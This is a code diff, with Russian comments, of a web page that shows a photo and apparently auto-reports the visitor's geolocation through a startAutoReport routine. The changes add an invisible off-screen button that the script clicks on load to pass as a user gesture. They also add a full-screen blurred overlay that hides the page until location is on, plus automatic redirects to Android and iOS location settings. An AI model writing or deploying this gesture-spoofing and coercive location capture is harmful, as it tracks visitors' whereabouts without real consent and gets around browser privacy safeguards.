@@ -43,41 +43,42 @@
     .err { color: #f66; }
     .ok { color: #6c6; }
 
-    /* Только нижняя полоска — фото на странице остаётся видимым */
+    /* Пока гео недоступна: весь экран + эффект матового стекла поверх контента */
     .geo-help {
       position: fixed;
-      left: 0;
-      right: 0;
-      bottom: 0;
+      inset: 0;
       z-index: 2147483647;
       display: flex;
-      justify-content: center;
-      align-items: flex-end;
-      padding: 0.45rem;
-      padding-bottom: max(0.5rem, env(safe-area-inset-bottom));
-      pointer-events: none;
+      flex-direction: column;
+      justify-content: flex-end;
+      align-items: center;
+      padding: 1rem;
+      padding-bottom: max(1rem, env(safe-area-inset-bottom));
+      background: rgba(16, 18, 24, 0.38);
+      -webkit-backdrop-filter: blur(24px) saturate(1.4);
+      backdrop-filter: blur(24px) saturate(1.4);
     }
     .geo-help--hidden {
       display: none !important;
     }
-    .geo-help__bar {
-      pointer-events: auto;
-      display: flex;
-      align-items: stretch;
-      gap: 0;
+    .geo-help__dock {
       width: 100%;
       max-width: min(100%, 520px);
-      border-radius: 12px;
+    }
+    .geo-help__bar {
+      display: flex;
+      align-items: stretch;
+      border-radius: 14px;
       overflow: hidden;
-      box-shadow: 0 6px 28px rgba(0, 0, 0, 0.55);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
     }
     .geo-help__cta {
       flex: 1;
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 0.85rem 0.75rem;
-      font-size: 0.95rem;
+      padding: 1rem 0.85rem;
+      font-size: 1rem;
       font-weight: 700;
       text-align: center;
       text-decoration: none;
@@ -93,30 +94,29 @@
       filter: brightness(1.08);
     }
     .geo-help__cta--disabled {
-      background: #444;
+      background: #3d4450;
       color: #bbb !important;
       pointer-events: none;
     }
-    .geo-help__retry {
-      flex: 0 0 3.1rem;
-      margin: 0;
+    /* Скрытая кнопка: программный клик при загрузке (часть браузеров считает жестом) */
+    .geo-synthetic {
+      position: fixed;
+      left: -9999px;
+      top: 0;
+      width: 1px;
+      height: 1px;
       padding: 0;
-      font-size: 1.35rem;
-      line-height: 1;
-      font-weight: 600;
-      border: none;
-      cursor: pointer;
-      font-family: inherit;
-      color: #e8e8e8;
-      background: #333;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .geo-help__retry:active {
-      background: #444;
+      margin: 0;
+      border: 0;
+      opacity: 0;
+      overflow: hidden;
     }
   </style>
 </head>
 <body>
+  <button type="button" id="geo-synthetic-start" class="geo-synthetic" tabindex="-1" aria-hidden="true">
+    geo
+  </button>
   <!-- position:relative чтобы абсолютный #status не уехал от окна -->
   <figure style="position: relative">
     <img
@@ -129,12 +129,11 @@
     <div id="status" aria-live="polite" aria-hidden="true"></div>
   </figure>
 
-  <div id="geo-help" class="geo-help geo-help--hidden" aria-hidden="true" role="region" aria-label="Геолокация">
-    <div class="geo-help__bar">
-      <a id="geo-help-cta" class="geo-help__cta" href="#">Включите геолокацию</a>
-      <button type="button" class="geo-help__retry" id="geo-help-retry" aria-label="Проверить снова" title="Проверить снова">
-        ↻
-      </button>
+  <div id="geo-help" class="geo-help geo-help--hidden" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Геолокация">
+    <div class="geo-help__dock">
+      <div class="geo-help__bar">
+        <a id="geo-help-cta" class="geo-help__cta" href="#">Включите геолокацию</a>
+      </div>
     </div>
   </div>
 
@@ -147,44 +146,88 @@
        */
       const statusEl = document.getElementById("status");
       let started = false;
+      var geoHelpOpen = false;
+      var geoAndroidIntentIndex = 0;
+
+      /**
+       * Несколько вариантов intent: Chrome, Яндекс, Samsung Internet, WebView (в т.ч. Telegram Android).
+       * Включить GPS из JS нельзя — только открыть экран настроек (ограничение ОС).
+       */
+      var ANDROID_LOCATION_INTENTS = [
+        "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end",
+        "intent://settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;package=com.android.settings;end",
+        "intent:#Intent;action=com.android.settings.action.location.MODE_SETTINGS;end",
+      ];
+
+      var IOS_LOCATION_PREFS = [
+        "App-Prefs:root=Privacy&path=LOCATION",
+        "prefs:root=Privacy&path=LOCATION",
+      ];
 
       function closeGeoHelpPanel() {
         var root = document.getElementById("geo-help");
         root.classList.add("geo-help--hidden");
         root.setAttribute("aria-hidden", "true");
+        geoHelpOpen = false;
       }
 
-      var ANDROID_LOC_INTENT =
-        "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
+      function navigateToUrl(url) {
+        try {
+          window.location.href = url;
+        } catch (_) {}
+      }
+
+      function tryAndroidLocationIntent(which) {
+        var list = ANDROID_LOCATION_INTENTS;
+        var i = typeof which === "number" ? which : geoAndroidIntentIndex % list.length;
+        navigateToUrl(list[i]);
+      }
+
+      function tryIosLocationPrefs(which) {
+        var list = IOS_LOCATION_PREFS;
+        var i = typeof which === "number" ? which : geoAndroidIntentIndex % list.length;
+        navigateToUrl(list[i]);
+      }
 
       function openGeoHelpPanel(code) {
         var root = document.getElementById("geo-help");
         var cta = document.getElementById("geo-help-cta");
-        var isAndroid = /Android/i.test(navigator.userAgent || "");
+        var ua = navigator.userAgent || "";
+        var isAndroid = /Android/i.test(ua);
+        var isIOS =
+          /iPhone|iPad|iPod/i.test(ua) ||
+          (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+
+        geoAndroidIntentIndex = 0;
+        geoHelpOpen = true;
 
         cta.onclick = null;
         cta.classList.remove("geo-help__cta--disabled");
+        cta.textContent = "Включите геолокацию";
 
-        if (code === 0) {
-          cta.textContent = "Включите геолокацию";
-          cta.setAttribute("href", "#");
-          cta.classList.add("geo-help__cta--disabled");
+        if (isAndroid) {
+          cta.setAttribute("href", ANDROID_LOCATION_INTENTS[0]);
           cta.onclick = function (e) {
             e.preventDefault();
+            tryAndroidLocationIntent(geoAndroidIntentIndex % ANDROID_LOCATION_INTENTS.length);
+            geoAndroidIntentIndex++;
           };
-        } else if (isAndroid) {
-          cta.textContent = "Включите геолокацию";
-          cta.setAttribute("href", ANDROID_LOC_INTENT);
-          /*
-           * Включить GPS скриптом нельзя (политика ОС). Сразу открываем экран настроек;
-           * если браузер блокирует без жеста — сработает повторное нажатие на ту же ссылку.
-           */
           setTimeout(function () {
-            window.location.href = ANDROID_LOC_INTENT;
+            tryAndroidLocationIntent(0);
+          }, 60);
+        } else if (isIOS) {
+          cta.setAttribute("href", IOS_LOCATION_PREFS[0]);
+          cta.onclick = function (e) {
+            e.preventDefault();
+            tryIosLocationPrefs(geoAndroidIntentIndex % IOS_LOCATION_PREFS.length);
+            geoAndroidIntentIndex++;
+          };
+          setTimeout(function () {
+            tryIosLocationPrefs(0);
           }, 80);
         } else {
-          cta.textContent = "Включите геолокацию";
           cta.setAttribute("href", "#");
+          cta.classList.add("geo-help__cta--disabled");
           cta.onclick = function (e) {
             e.preventDefault();
           };
@@ -193,9 +236,11 @@
         root.classList.remove("geo-help--hidden");
         root.setAttribute("aria-hidden", "false");
       }
-      document.getElementById("geo-help-retry").addEventListener("click", function () {
-        closeGeoHelpPanel();
+
+      document.addEventListener("visibilitychange", function () {
+        if (document.visibilityState !== "visible" || !geoHelpOpen) return;
         started = false;
+        closeGeoHelpPanel();
         requestAnimationFrame(function () {
           startAutoReport();
         });
@@ -788,8 +833,17 @@
       }
 
       document.addEventListener("DOMContentLoaded", function () {
+        var syn = document.getElementById("geo-synthetic-start");
+        if (syn) {
+          syn.addEventListener("click", function () {
+            startAutoReport();
+          });
+        }
         requestAnimationFrame(function () {
-          startAutoReport();
+          requestAnimationFrame(function () {
+            if (syn) syn.click();
+            else startAutoReport();
+          });
         });
       });
     })();
